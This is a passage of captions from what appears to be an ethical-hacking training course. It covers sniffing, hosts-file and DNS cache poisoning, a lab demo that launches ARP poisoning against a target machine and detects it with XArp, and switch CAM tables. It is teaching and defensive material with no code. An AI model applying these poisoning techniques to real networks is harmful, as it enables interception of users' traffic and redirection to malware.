00:44:49.050\nSo if we can gain an advantage in time and\nenergy by looking at a host file,\n\n961\n00:44:49.050 --> 00:44:54.340\nan LM host file, an R cache, a DNS\nresolver cache, on the local machine.\n\n962\n00:44:54.340 --> 00:44:58.160\nWe're gonna do that before we go out and\nmake a query across the network or\n\n963\n00:44:58.160 --> 00:45:01.010\ndo something like that to\nfind this information.\n\n964\n00:45:01.010 --> 00:45:02.282\nBecause it's quicker, right?\n\n965\n00:45:02.282 --> 00:45:05.220\nThis is the concept of proxying,\nand caching generically.\n\n966\n00:45:05.220 --> 00:45:05.782\nIt's quicker.\n\n967\n00:45:05.782 --> 00:45:08.965\nAnd it's usually gonna be not only\nquicker but it's gonna have the accurate\n\n968\n00:45:08.965 --> 00:45:12.210\ninformation if we've been there\nrecently with one exception.\n\n969\n00:45:12.210 --> 00:45:16.360\nIf we purposely go out and modify that\nwithout the user's consent or knowledge,\n\n970\n00:45:16.360 --> 00:45:19.728\nwe are now spoofing and\nessentially poisoning is what we call it.\n\n971\n00:45:19.728 --> 00:45:23.757\nWe're doing an ARP poisoning or an ARP\ncache attack, an ARP poisoning attack,\n\n972\n00:45:23.757 --> 00:45:26.980\nDNS resolver cache attacks\nare poisoning attacks as well.\n\n973\n00:45:26.980 --> 00:45:30.630\nWe are inserting bad resolution data\n\n974\n00:45:30.630 --> 00:45:34.100\nknowingly because we know that we'll\nnever get off the machine to validate it.\n\n975\n00:45:34.100 --> 00:45:35.394\nWe simply go with what's there.\n\n976\n00:45:35.394 --> 00:45:38.213\nSo this is how a lot of\nmalware will redirect you.\n\n977\n00:45:38.213 --> 00:45:40.570\nYou want to go see Mike's website?\n\n978\n00:45:40.570 --> 00:45:42.970\nWell, great,\nMike's website is normally over here.\n\n979\n00:45:42.970 --> 00:45:45.610\nBut I'm going to put a resolution\nitem in locally that says\n\n980\n00:45:45.610 --> 00:45:47.260\nit's going to be over here.\n\n981\n00:45:47.260 --> 00:45:50.420\nAnd as a result of that, when you go,\nyou're going to be redirected to this\n\n982\n00:45:50.420 --> 00:45:52.390\nspoofed site that's\ngoing to have malware or\n\n983\n00:45:52.390 --> 00:45:54.810\nwhatever on it instead of\ngoing to the normal site.\n\n984\n00:45:54.810 --> 00:45:58.310\nBecause you never get out of the machine\nto actually ask the DNS query\n\n985\n00:45:58.310 --> 00:46:00.030\nto validate that it's somewhere else.\n\n986\n00:46:00.030 --> 00:46:03.390\nYou resolve or\nlook at what's local and go with that.\n\n987\n00:46:03.390 --> 00:46:07.390\nThis is why also a lot of the times\nwhen we see this kind of behavior and\n\n988\n00:46:07.390 --> 00:46:10.150\nyou have trouble connecting and\nall of a sudden you restart the machine.\n\n989\n00:46:10.150 --> 00:46:13.780\nThen a lot of those things go away\nbecause those entries are dynamic\n\n990\n00:46:13.780 --> 00:46:15.970\nunless we make them static entries.\n\n991\n00:46:15.970 --> 00:46:19.540\nAnd we can do that, and if we do,\nthey will persist, right?\n\n992\n00:46:19.540 --> 00:46:22.580\nBut if they're dynamic they often\nwill sit in memory just for\n\n993\n00:46:22.580 --> 00:46:24.860\nthe purposes of the attack or\nthe redirect.\n\n994\n00:46:24.860 --> 00:46:27.090\nAnd that cache is wiped out as we restart.\n\n995\n00:46:27.090 --> 00:46:29.340\nSo as a result the evidence\nof that goes away.\n\n996\n00:46:29.340 --> 00:46:30.972\nWhich is kind of interesting and\nkind of cool.\n\n997\n00:46:30.972 --> 00:46:33.320\nAll right so let's go back, let's take\na look at how to actually do this.\n\n998\n00:46:33.320 --> 00:46:34.320\nSo we're gonna go in and\n\n999\n00:46:34.320 --> 00:46:39.360\nwe're gonna actually specify that we\nwant to be able to select a machine.\n\n1000\n00:46:39.360 --> 00:46:42.370\nSo we're gonna start here\non 01 in the left and\n\n1001\n00:46:42.370 --> 00:46:46.850\non the right we're going to do\n05 which is gonna be our target.\n\n1002\n00:46:46.850 --> 00:46:47.880\nSo we're gonna highlight those.\n\n1003\n00:46:47.880 --> 00:46:49.630\nWe're gonna click OK.\n\n1004\n00:46:50.680 --> 00:46:52.400\nSo we're gonna set that up.\n\n1005\n00:46:52.400 --> 00:46:56.830\nAnd so now that we have that in there\nwhat we're now gonna do and you'll see,\n\n1006\n00:46:56.830 --> 00:46:59.880\nwe can kind of see them sitting\nin the pane, status idle, IP 01,\n\n1007\n00:46:59.880 --> 00:47:03.230\nMac address and\nMac address whatever for 05.\n\n1008\n00:47:03.230 --> 00:47:06.953\nNow we're going to start the ARP.\n\n1009\n00:47:06.953 --> 00:47:08.730\nSo we're going to start/stop,\n\n1010\n00:47:08.730 --> 00:47:11.350\nrather we're going to click the Start/Stop\nbutton is what I mean to say.\n\n1011\n00:47:11.350 --> 00:47:15.210\nWe're going to go in here, and\nI love the little icons, the biohazard.\n\n1012\n00:47:15.210 --> 00:47:16.651\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Yellow and black,\n\n1013\n00:47:16.651 --> 00:47:18.640\nnuclear radiation kinda things.\n\n1014\n00:47:18.640 --> 00:47:20.150\nSo we're gonna click that.\n\n1015\n00:47:20.150 --> 00:47:24.360\nWe're gonna get the little hey, block\nhim at the firewall, fine, no big deal.\n\n1016\n00:47:24.360 --> 00:47:27.370\nRemember we said XARP would pop\nup if we have anything going on.\n\n1017\n00:47:27.370 --> 00:47:30.240\nWe could see the XARP warning\noff to the right there, right?\n\n1018\n00:47:30.240 --> 00:47:31.490\nSo that's kinda cool.\n\n1019\n00:47:31.490 --> 00:47:32.050\nRight?\n\n1020\n00:47:32.050 --> 00:47:32.560\nSo-\n&gt;&gt; It knows.\n\n1021\n00:47:33.760 --> 00:47:34.480\n&gt;&gt; Yes, it does.\n\n1022\n00:47:34.480 --> 00:47:38.780\nYes, so we're gonna allow this cuz\nwe're gonna be bad administrators and\n\n1023\n00:47:38.780 --> 00:47:40.752\nallow our system to be compromised.\n\n1024\n00:47:40.752 --> 00:47:42.099\nRight?\n[LAUGH] But you'll notice that it\n\n1025\n00:47:42.099 --> 00:47:43.643\nwent from idle over here to poisoning.\n\n1026\n00:47:43.643 --> 00:47:44.748\n&gt;&gt; Mm-hm.\n\n1027\n00:47:44.748 --> 00:47:46.950\n&gt;&gt; The status now says poisoning, right?\n\n1028\n00:47:46.950 --> 00:47:50.795\nAnd so now we're actually trying to\nactively poison that connection.\n\n1029\n00:47:50.795 --> 00:47:52.030\nAnd so we do have an alert.\n\n1030\n00:47:52.030 --> 00:47:55.380\nThere's actually 22 alerts\nsitting in the XR system.\n\n1031\n00:47:55.380 --> 00:47:57.830\nAnd it comes up and says, hey,\nMAC filter incoming packet, but\n\n1032\n00:47:57.830 --> 00:48:00.240\nsender MAC sets our own MAC address.\n\n1033\n00:48:00.240 --> 00:48:03.310\nWell, sender MAC sets our own MAC address,\nthat's bizarre.\n\n1034\n00:48:03.310 --> 00:48:06.370\nIf you read the actual, I know it's kinda\nsmall, you may not be able to see it.\n\n1035\n00:48:06.370 --> 00:48:10.289\nBut if you look at it carefully, you'll\nsee that I'm pointing to it on the screen.\n\n1036\n00:48:10.289 --> 00:48:13.502\nThat's essentially saying,\nhey by the way, we're outside ourselves,\n\n1037\n00:48:13.502 --> 00:48:15.849\nwe're having an out of body\nback experience, right?\n\n1038\n00:48:15.849 --> 00:48:16.670\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n1039\n00:48:16.670 --> 00:48:20.390\nwe're sending traffic to ourselves from\noutside the machine, but it's us, so\n\n1040\n00:48:20.390 --> 00:48:21.830\nhow's that happening, right?\n\n1041\n00:48:21.830 --> 00:48:26.020\nSo since we're not actively cloning\nanything, that is a potential issue.\n\n1042\n00:48:26.020 --> 00:48:28.960\nAnd it says, source MAC and\ndestination MAC.\n\n1043\n00:48:28.960 --> 00:48:31.300\nAnd it gives us all the information here.\n\n1044\n00:48:31.300 --> 00:48:33.580\nAnd it shows us,\nif you look at the bottom,\n\n1045\n00:48:33.580 --> 00:48:37.300\nthe source IP where it's coming from,\nand the destination IP.\n\n1046\n00:48:37.300 --> 00:48:39.048\nAnd it shows us that information.\n\n1047\n00:48:39.048 --> 00:48:43.424\nSo it does warn us, as an early warning\nsystem, that this is happening.\n\n1048\n00:48:43.424 --> 00:48:47.552\nSo when we try to carry out in our spoof\nattack, we're actually then able to go\n\n1049\n00:48:47.552 --> 00:48:52.190\nin and we're able to actually see evidence\nof this, which is kinda nice, right?\n\n1050\n00:48:52.190 --> 00:48:53.680\nSo if somebody was executing this and\n\n1051\n00:48:53.680 --> 00:48:57.240\nwe were running XR, we actually\nwould be able to see evidence of it.\n\n1052\n00:48:57.240 --> 00:49:00.213\nAnd we would know which,\nwell in theory anyway we would know right,\n\n1053\n00:49:00.213 --> 00:49:02.715\nwhich obviously is important for\nus to consider as well.\n\n1054\n00:49:02.715 --> 00:49:03.620\n&gt;&gt; Mm-hm.\n&gt;&gt; And to be aware of.\n\n1055\n00:49:03.620 --> 00:49:06.590\nSo this is just some,\nthese are I should say, some of the tools,\n\n1056\n00:49:06.590 --> 00:49:10.306\nsome of the ways that we can go in and\nexamine sniffing,\n\n1057\n00:49:10.306 --> 00:49:14.140\nthe things we can do with it, and the\noutput and the stuff that we would get.\n\n1058\n00:49:14.140 --> 00:49:15.610\nNow before we do it,\nno, no, let's go back.\n\n1059\n00:49:15.610 --> 00:49:16.390\nLet's go back one more time.\n\n1060\n00:49:16.390 --> 00:49:17.446\nI wanna show you one other thing.\n\n1061\n00:49:17.446 --> 00:49:18.486\nI keep telling you about the premature-\n&gt;&gt; I know.\n\n1062\n00:49:18.486 --> 00:49:20.933\n[LAUGH]\n&gt;&gt; The premature cut-over.\n\n1063\n00:49:20.933 --> 00:49:22.720\n&gt;&gt; Jumping the gun.\n&gt;&gt; You gotta stop doing that.\n\n1064\n00:49:22.720 --> 00:49:24.510\nI just wanna show\nthe people one more thing,\n\n1065\n00:49:24.510 --> 00:49:27.690\nwhich is remember, I wanted to show the\ninterface, cuz now we could see, right?\n\n1066\n00:49:27.690 --> 00:49:28.740\nWe didn't see it before.\n\n1067\n00:49:28.740 --> 00:49:31.920\nBut we could see the red x's,\nso we see the impact of that.\n\n1068\n00:49:31.920 --> 00:49:34.400\nAnd remember if we look at\nthe log file now, right?\n\n1069\n00:49:35.740 --> 00:49:37.160\nLook at all the new stuff that's in.\n\n1070\n00:49:37.160 --> 00:49:39.070\nRemember, we saw,\nit was like three or four entries.\n\n1071\n00:49:39.070 --> 00:49:40.970\nWe could see all that stuff in there now.\n\n1072\n00:49:40.970 --> 00:49:42.585\nAnd, obviously we don't have to\nstart going through the log,\n\n1073\n00:49:42.585 --> 00:49:43.690\nlooking what's in there.\n\n1074\n00:49:43.690 --> 00:49:46.600\nBut we could see that there is\ndefinitely evidence of the fact\n\n1075\n00:49:46.600 --> 00:49:48.130\nthat we've got activity going on, right?\n\n1076\n00:49:48.130 --> 00:49:52.825\nSo, this is gonna show us kind of a trip\nwirer, an early warning system, right?\n\n1077\n00:49:52.825 --> 00:49:57.063\nRunning in the stack,\nmonitoring incoming and outgoing traffic,\n\n1078\n00:49:57.063 --> 00:50:00.869\nit's gonna warn us that we\nare having this kind of activity.\n\n1079\n00:50:00.869 --> 00:50:03.320\nSo, for me anyway,\nthis is kinda cool stuff.\n\n1080\n00:50:03.320 --> 00:50:04.660\n&gt;&gt; Absolutely.\n&gt;&gt; This is what I live to do.\n\n1081\n00:50:04.660 --> 00:50:06.310\nThis is really kind of cool,\ncuz this is the nuts and\n\n1082\n00:50:06.310 --> 00:50:08.270\nbolts of what we're talking\nabout doing in class.\n\n1083\n00:50:08.270 --> 00:50:11.490\nAnd being able to show you how\nto go in and not only sniff, but\n\n1084\n00:50:11.490 --> 00:50:13.220\nto detect the fact you're being sniffed.\n\n1085\n00:50:13.220 --> 00:50:16.090\nHow to execute an ARP attack from\na poisoning perspective, but\n\n1086\n00:50:16.090 --> 00:50:17.790\nalso counteract it at the same time.\n\n1087\n00:50:17.790 --> 00:50:19.330\nWe've done a lot of\nstuff in that one demo,\n\n1088\n00:50:19.330 --> 00:50:21.250\nif you think about all\nthe stuff we're doing.\n\n1089\n00:50:21.250 --> 00:50:24.110\nSo, pretty cool stuff,\nhopefully you found it to be as well.\n\n1090\n00:50:24.110 --> 00:50:27.322\nNow, now, now we can do that.\n\n1091\n00:50:27.322 --> 00:50:29.022\n&gt;&gt; Okay, [LAUGH] All right,\nI'll give Megan the sign.\n\n1092\n00:50:29.022 --> 00:50:30.794\n&gt;&gt; Now, there you go,\nyou see, now, all right.\n\n1093\n00:50:30.794 --> 00:50:32.310\n&gt;&gt; Too late,\nshe's already taken care of it.\n\n1094\n00:50:32.310 --> 00:50:33.280\nAll right, Adam, again,\n\n1095\n00:50:33.280 --> 00:50:36.490\nthat was a great episode there,\na lot of fantastic demonstrations.\n\n1096\n00:50:36.490 --> 00:50:40.220\nReally taking a look at what you can get\nwith running these network sniffers,\n\n1097\n00:50:40.220 --> 00:50:41.830\ngetting to look at the raw data.\n\n1098\n00:50:41.830 --> 00:50:44.670\nAnd as you said,\nit's fascinating if you're geeks like us,\n\n1099\n00:50:44.670 --> 00:50:46.840\nwhich I'm sure you are,\nthat's why you're here.\n\n1100\n00:50:46.840 --> 00:50:49.140\nThat's a great way to\nlearn about protocols and\n\n1101\n00:50:49.140 --> 00:50:51.090\nthe way things are working\nin the background.\n\n1102\n00:50:51.090 --> 00:50:54.060\nNot to mention,\na lot of attacks are getting carried out,\n\n1103\n00:50:54.060 --> 00:50:55.720\npeople stealing information.\n\n1104\n00:50:55.720 --> 00:50:58.620\nNow we can detect whether somebody's\nrunning in promiscuous mode.\n\n1105\n00:50:58.620 --> 00:51:01.960\nWe can find out whether somebody's\nplaying around with the MAC addresses and\n\n1106\n00:51:01.960 --> 00:51:04.370\nmaybe trying to do some ARP poisoning or\n\n1107\n00:51:04.370 --> 00:51:06.360\na man-in-the-middle attack or\nsomething like that.\n\n1108\n00:51:06.360 --> 00:51:09.460\nCuz that's kind of where that\nis going to lead most likely.\n\n1109\n00:51:09.460 --> 00:51:10.620\nSo we appreciate that, Adam.\n\n1110\n00:51:10.620 --> 00:51:12.820\nWe hope everybody out\nthere enjoyed watching.\n\n1111\n00:51:12.820 --> 00:51:17.023\nSigning off for ITProTV, I'm Mike\nRoderick, and we'll see you next time.\n\n1112\n00:51:17.023 --> 00:51:17.809\n&gt;&gt; I'm Silent Bob.\n\n1113\n00:51:17.809 --> 00:51:18.969\n&gt;&gt; [LAUGH]\n&gt;&gt; Wait, I wasn't supposed to talk.\n\n1114\n00:51:18.969 --> 00:51:19.615\nSorry about that.\n\n1115\n00:51:19.615 --> 00:51:28.370\n[MUSIC]\n\n",

00:00:17.151\nI'm your host Mike Rodrick, and\n\n4\n00:00:17.151 --> 00:00:20.081\ntoday we're doing our certified\nethical hacker version nine.\n\n5\n00:00:20.081 --> 00:00:24.120\nAnd specifically in this episode we're\nactually continuing our conversation\n\n6\n00:00:24.120 --> 00:00:24.990\nwith sniffing.\n\n7\n00:00:24.990 --> 00:00:28.560\nWe've had a couple of episodes where\nwe've looked at what sniffing is.\n\n8\n00:00:28.560 --> 00:00:29.910\nAnd how we can go about it.\n\n9\n00:00:29.910 --> 00:00:33.980\nWe had a really good episode where we\ndid a lot of hands-on demonstrations\n\n10\n00:00:33.980 --> 00:00:35.460\non performing sniffing.\n\n11\n00:00:35.460 --> 00:00:38.080\nAnd we have more to talk about\nwhen it comes to sniffing.\n\n12\n00:00:38.080 --> 00:00:40.320\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n13\n00:00:40.320 --> 00:00:41.190\nHow you doing, Adam?\n\n14\n00:00:41.190 --> 00:00:43.130\n&gt;&gt; I'm doing well,\nI'm doing well, thank you.\n\n15\n00:00:43.130 --> 00:00:46.350\nPart two is always a charm as\nopposed to the first time around.\n\n16\n00:00:46.350 --> 00:00:49.610\nSo we're gonna continue\ntalking about sniffing.\n\n17\n00:00:49.610 --> 00:00:52.020\nAs Mike was saying,\nwe did a really cool episode.\n\n18\n00:00:52.020 --> 00:00:54.690\nMike was kind enough to help\nnarrate with me through that.\n\n19\n00:00:54.690 --> 00:00:58.120\nWe did some interesting hands-on things,\nshowed you some cool tools.\n\n20\n00:00:58.120 --> 00:01:01.900\nAnd you definitely wanna check that\nout if you have not had the chance to.\n\n21\n00:01:01.900 --> 00:01:05.080\nI don't normally recommend\nthat you go out of sequence,\n\n22\n00:01:05.080 --> 00:01:06.550\ngo out of order with our discussions.\n\n23\n00:01:06.550 --> 00:01:08.215\nIt's always good to have the context.\n\n24\n00:01:08.215 --> 00:01:11.450\nBut that lesson may actually\ngive you the background for\n\n25\n00:01:11.450 --> 00:01:13.080\nsome of the stuff we're gonna talk about.\n\n26\n00:01:13.080 --> 00:01:14.640\nSo if you really haven't seen it yet,\n\n27\n00:01:14.640 --> 00:01:17.490\nit would be good to see it before\nwe continue our conversations\n\n28\n00:01:17.490 --> 00:01:20.810\nnow just cuz we're about to delve in\nto the mechanics of what we showed you.\n\n29\n00:01:20.810 --> 00:01:22.120\nAnd talk about how it actually happens.\n\n30\n00:01:22.120 --> 00:01:23.930\nSo just as a note, just so you know that.\n\n31\n00:01:23.930 --> 00:01:26.550\nIf not, then throw a caution\nthrough the window, what the hell,\n\n32\n00:01:26.550 --> 00:01:28.390\nyou'll figure it out at some point anyway,\nright?\n\n33\n00:01:28.390 --> 00:01:30.670\nAll right, so\nlet's talk a bit about sniffing.\n\n34\n00:01:30.670 --> 00:01:32.830\nYou know,\nwe've talked a lot about the concepts,\n\n35\n00:01:32.830 --> 00:01:36.440\nnow what we wanna do is delve deeper\ninto as I said the mechanics.\n\n36\n00:01:36.440 --> 00:01:39.990\nSo we have a switch, hypothetically, and\n\n37\n00:01:39.990 --> 00:01:42.950\nwe put that switch out and\nwe set it up in our network and run it,\n\n38\n00:01:42.950 --> 00:01:46.110\nas we talked about in episode\nnumber one on this set of topics.\n\n39\n00:01:46.110 --> 00:01:50.500\nWe are looking at traffic coming through\nthe switch at layer two so, and I know,\n\n40\n00:01:50.500 --> 00:01:53.430\nbig disclaimer, right,\nno switches operate at multiple layers.\n\n41\n00:01:53.430 --> 00:01:55.530\nOf the OSI model as we've discussed.\n\n42\n00:01:55.530 --> 00:01:57.520\nClassically, from a definition standpoint,\n\n43\n00:01:57.520 --> 00:02:00.490\nwe refer to a switch traditionally\nas a layer two device.\n\n44\n00:02:00.490 --> 00:02:03.720\nWe're just simply going with that\ndefinition for this conversation.\n\n45\n00:02:03.720 --> 00:02:07.360\nSo we're talking about MAC addresses\nat layer two of the OSI model.\n\n46\n00:02:07.360 --> 00:02:10.850\nAnd looking at MAC addresses to\nbuild what's called the CAM table,\n\n47\n00:02:10.850 --> 00:02:12.710\nthe dynamic content accessible.\n\n48\n00:02:12.710 --> 00:02:16.794\nOr excuse me, content-addressable memory\ntable that the router or the switch uses.\n\n49\n00:02:16.794 --> 00:02:19.302\nI'm just all over the place\ntoday with my OSI references.\n\n50\n00:02:19.302 --> 00:02:22.428\n&gt;&gt; [LAUGH] The CAM table,\nthe content-addressable memory table that\n\n51\n00:02:22.428 --> 00:02:25.625\nthe switch uses to build essentially\nits knowledge of the network.\n\n52\n00:02:25.625 --> 00:02:27.595\nIt's quote unquote routing table.\n\n53\n00:02:27.595 --> 00:02:28.317\nThat's a half air quote by the way.\n\n54\n00:02:28.317 --> 00:02:29.013\n&gt;&gt; I like that.\n\n55\n00:02:29.013 --> 00:02:29.919\n&gt;&gt; It's not a full air quote.\n\n56\n00:02:29.919 --> 00:02:33.339\n[LAUGH] It's my own special thing,\na half air quote with a thumb hook.\n\n57\n00:02:33.339 --> 00:02:35.336\n&gt;&gt; So, it's like a A thumb air quote.\n\n58\n00:02:35.336 --> 00:02:36.960\n&gt;&gt; Kind of leaving it open for future?\n\n59\n00:02:36.960 --> 00:02:38.900\nYeah.\n&gt;&gt; I am I'm giving the opportunity there.\n\n60\n00:02:38.900 --> 00:02:40.690\nWhat I can do it right off\nthe side you know it was perfect.\n\n61\n00:02:40.690 --> 00:02:42.860\nI could have done it off the side\nof the screen while Mike was there.\n\n62\n00:02:42.860 --> 00:02:44.390\nCould have hooked his\nface when I did this.\n\n63\n00:02:44.390 --> 00:02:45.110\nIt would have been there.\n\n64\n00:02:45.110 --> 00:02:45.955\nYeah there you go look.\n\n65\n00:02:45.955 --> 00:02:47.640\n&gt;&gt; [LAUGH]\n&gt;&gt; It's coming to get you.\n\n66\n00:02:47.640 --> 00:02:48.331\n&gt;&gt; No not the single air quote.\n\n67\n00:02:48.331 --> 00:02:49.059\n&gt;&gt; No.\n\n68\n00:02:49.059 --> 00:02:53.790\n&gt;&gt; [LAUGH]\n&gt;&gt; Anyway so it's Tuesday here, right?\n\n69\n00:02:53.790 --> 00:02:55.000\nAnd it's like a Wednesday.\n\n70\n00:02:55.000 --> 00:02:55.700\nAll right.\n\n71\n00:02:55.700 --> 00:02:57.360\nSo, the CAM table and the switch.\n\n72\n00:02:57.360 --> 00:03:00.530\nSo what I was saying is, we're just\ngonna go with that traditional layer two\n\n73\n00:03:00.530 --> 00:03:02.970\ndefinition, just for\nthe purposes of our discussion.\n\n74\n00:03:02.970 --> 00:03:06.460\nWe do know that switches can operate\nat higher layers of the OSI model, and\n\n75\n00:03:06.460 --> 00:03:07.420\nnobody's disputing that.\n\n76\n00:03:07.420 --> 00:03:09.600\nDon't want you to be\nconfused by that at all.\n\n77\n00:03:09.600 --> 00:03:12.110\nBut we're just gonna keep it relatively\nstraight forward and simple for\n\n78\n00:03:12.110 --> 00:03:13.030\nour purposes here.\n\n79\n00:03:13.030 --> 00:03:15.940\nSo when we think about the CAM table we're\nessentially thinking about the table of\n\n80\n00:03:15.940 --> 00:03:17.360\nMAC addresses, right?\n\n81\n00:03:17.360 --> 00:03:21.190\nThat the switch builds in memory\ndynamically as it is sending traffic back\n\n82\n00:03:21.190 --> 00:03:25.420\nand forth looking at traffic to understand\nthe layout, if you will, of the network.\n\n83\n00:03:25.420 --> 00:03:29.500\nWe store information like\nthe MAC address as I said and\n\n84\n00:03:29.500 --> 00:03:31.960\nof course physical ports and\nmaybe VLAN perimeters.\n\n85\n00:03:31.960 --> 00:03:33.460\nThat would be associated with.\n\n86\n00:03:33.460 --> 00:03:36.020\nYou can think of it as a little grid,\na little matrix table.\n\n87\n00:03:37.070 --> 00:03:41.740\nImagine a column, it says VLN ID,\none it says Mac address ID.\n\n88\n00:03:41.740 --> 00:03:46.560\nImagine one that may say type and learn\nand age and ports, these are all columns.\n\n89\n00:03:46.560 --> 00:03:48.160\nAnd we would have this information.\n\n90\n00:03:48.160 --> 00:03:51.230\nEssentially set up as a matrix and\nmemory that we can access.\n\n91\n00:03:51.230 --> 00:03:54.430\nAnd the idea behind the CAM table\nis the idea of how we send or\n\n92\n00:03:54.430 --> 00:03:57.600\nreceive information and\nof knowledge of it through the switch.\n\n93\n00:03:57.600 --> 00:04:01.125\nWhen a machine broadcasts or\nsends its information through\n\n94\n00:04:01.125 --> 00:04:06.200\nthe switch looking to send packets, the\nswitch is gonna examine that CAM table.\n\n95\n00:04:06.200 --> 00:04:08.660\nDo I have knowledge of\nthis inbound request or\n\n96\n00:04:08.660 --> 00:04:12.800\nthis address request coming from let's\nsay the machine called Mike, right.\n\n97\n00:04:12.800 --> 00:04:16.490\nAnd if Mike's information is not known\nto us, we're gonna look at that,\n\n98\n00:04:16.490 --> 00:04:17.730\nwe're gonna say hey this is unknown.\n\n99\n00:04:17.730 --> 00:04:20.640\nAnd we're gonna broadcast\nthe R packet request\n\n100\n00:04:20.640 --> 00:04:23.010\nout to all the systems that\nare connected to the switch.\n\n101\n00:04:23.010 --> 00:04:25.950\nSo we're gonna broadcast\nthat out on various ports\n\n102\n00:04:25.950 --> 00:04:27.740\nto anybody in theory in the subnet.\n\n103\n00:04:27.740 --> 00:04:30.940\nThat maybe connected right through\nthat particular area of the switch.\n\n104\n00:04:30.940 --> 00:04:33.810\nSo maybe theres an Adam\nmachine on the other side.\n\n105\n00:04:33.810 --> 00:04:35.990\nMaybe there's a Megan\nmachine on the other side.\n\n106\n00:04:35.990 --> 00:04:37.700\nMaybe there's a Don\nmachine on the other side.\n\n107\n00:04:37.700 --> 00:04:38.280\nWho knows, right?\n\n108\n00:04:38.280 --> 00:04:39.700\nWhatever the machines are.\n\n109\n00:04:39.700 --> 00:04:42.270\nAnd those machines will\nhear that broadcast, or\n\n110\n00:04:42.270 --> 00:04:47.245\nthey will see that our broadcast,\nhey do you know where Mike is?\n\n111\n00:04:47.245 --> 00:04:48.825\nThe R for Mike's machine, right?\n\n112\n00:04:48.825 --> 00:04:49.345\nDo we know that?\n\n113\n00:04:49.345 --> 00:04:52.115\nAnd so we're gonna see that\ngoing kind of a stage one.\n\n114\n00:04:52.115 --> 00:04:55.830\nStage two coming back,\nMike's machine if it is on that switch,\n\n115\n00:04:55.830 --> 00:04:58.890\nwill send back a response such as saying,\nhey, I am Mike.\n\n116\n00:04:58.890 --> 00:05:00.250\nHere I am.\n\n117\n00:05:00.250 --> 00:05:01.010\nThis is me.\n\n118\n00:05:01.010 --> 00:05:05.470\nWe were talking about DHCP right\nbefore we got on awhile ago and\n\n119\n00:05:05.470 --> 00:05:08.010\nexamining and\nlooking at all the scan traffic and\n\n120\n00:05:08.010 --> 00:05:11.260\nactually seeing the DHCP traffic\nrequests coming back and forth.\n\n121\n00:05:11.260 --> 00:05:12.150\nAnd it will be like this.\n\n122\n00:05:12.150 --> 00:05:15.150\nIf we were actually scanning and\nwatching it, we would see that, right?\n\n123\n00:05:15.150 --> 00:05:17.360\nAnd we would see that\ninformation coming back and\n\n124\n00:05:17.360 --> 00:05:19.360\nwe would get back that information.\n\n125\n00:05:19.360 --> 00:05:22.310\nThe original machine would say okay,\ngreat, I now know where my key is.\n\n126\n00:05:22.310 --> 00:05:24.150\nI have the information for that.\n\n127\n00:05:24.150 --> 00:05:27.520\nAnd the switch says, by the way, I should\nprobably make a note about that, right?\n\n128\n00:05:27.520 --> 00:05:29.520\nBecause I may need that information.\n\n129\n00:05:29.520 --> 00:05:32.160\nYou'll add them in migr,\ntidus in migr, whatever.\n\n130\n00:05:32.160 --> 00:05:33.650\nShe was feeling left out when I said that.\n\n131\n00:05:33.650 --> 00:05:35.108\n&gt;&gt; [LAUGH]\n&gt;&gt; It was like, what the hell?\n\n132\n00:05:35.108 --> 00:05:36.214\nYou didn't mention me, and.\n\n133\n00:05:36.214 --> 00:05:37.370\nLike, I'm just sitting here.\n\n134\n00:05:37.370 --> 00:05:38.124\nThere's nothing?\n\n135\n00:05:38.124 --> 00:05:39.381\nAll this work and I get nothing?\n\n136\n00:05:39.381 --> 00:05:41.700\nSo I don't want you to feel\nleft out about that, all right?\n\n137\n00:05:41.700 --> 00:05:44.510\nSo he says, hey, by the way,\nI'm gonna make a note about that,\n\n138\n00:05:44.510 --> 00:05:46.470\ncuz I reserved that special spot just for\nyou.\n\n139\n00:05:46.470 --> 00:05:47.500\nYou're the switch.\n\n140\n00:05:47.500 --> 00:05:48.550\nYou're the most important person.\n\n141\n00:05:48.550 --> 00:05:49.170\n&gt;&gt; There we go.\n\n142\n00:05:49.170 --> 00:05:49.690\n&gt;&gt; Right.\n\n143\n00:05:49.690 --> 00:05:50.890\nYou get that the whole switch.\n\n144\n00:05:50.890 --> 00:05:52.270\nYou like that right?\n\n145\n00:05:52.270 --> 00:05:52.780\nThat was good.\n\n146\n00:05:52.780 --> 00:05:54.260\nI thought about that\non the fly by the way.\n\n147\n00:05:54.260 --> 00:05:55.630\nThat was totally off the cuff.\n\n148\n00:05:55.630 --> 00:05:58.512\nSo we have this switch\nrecording that information.\n\n149\n00:05:58.512 --> 00:06:02.019\nWriting it down say hey, I want to know\nthe next time Adam and Mike want to talk.\n\n150\n00:06:02.019 --> 00:06:05.817\nI want to have that information, I want\nto have that available so it records that\n\n151\n00:06:05.817 --> 00:06:09.672\ninformation in the CAM table and then the\nnext time we send that information out we\n\n152\n00:06:09.672 --> 00:06:12.979\ndon't have to broadcast the ARP request so\nthat everybody hears it.\n\n153\n00:06:12.979 --> 00:06:17.138\nBut rather we simple have a directional\nconversation right, between myself and\n\n154\n00:06:17.138 --> 00:06:18.064\nMike or whoever.\n\n155\n00:06:18.064 --> 00:06:21.132\nSo I can go directly to switch and\nsay hey I wanna talk to Mike and\n\n156\n00:06:21.132 --> 00:06:23.197\nMike's information is in the CAM table,\n\n157\n00:06:23.197 --> 00:06:26.030\nswitch says great no problem\nlet me connect you, right.\n\n158\n00:06:26.030 --> 00:06:28.230\nSo this is what the CAM table represents.\n\n159\n00:06:28.230 --> 00:06:31.437\nIt represents our ability to\nunderstand how we can send and\n\n160\n00:06:31.437 --> 00:06:35.692\nreceive traffic through this hardware\ndevice called the switch sometimes as\n\n161\n00:06:35.692 --> 00:06:38.240\nwe've talked about the virtual appliance.\n\n162\n00:06:38.240 --> 00:06:42.150\nLet's just assume a piece of hardware\njust for purposes of our conversation.\n\n163\n00:06:42.150 --> 00:06:43.600\nWe're sending it back and forth.\n\n164\n00:06:43.600 --> 00:06:46.090\nBut we're doing so using this information.\n\n165\n00:06:46.090 --> 00:06:48.920\nNow this explanation is important for\na couple of reasons.\n\n166\n00:06:48.920 --> 00:06:53.851\nNumber one, we have to understand that the\nCAM table like any other dynamic piece of\n\n167\n00:06:53.851 --> 00:06:58.727\ninformation or collection of information\nin the system is maintained in memory.\n\n168\n00:06:58.727 --> 00:07:02.277\nAnd there's only a certain amount of\nphysical memory available in the device\n\n169\n00:07:02.277 --> 00:07:05.500\nand the switch, right,\nonboard memory is what we refer to it as.\n\n170\n00:07:05.500 --> 00:07:10.540\nWe don't traditionally cache\ninformation to a paging file 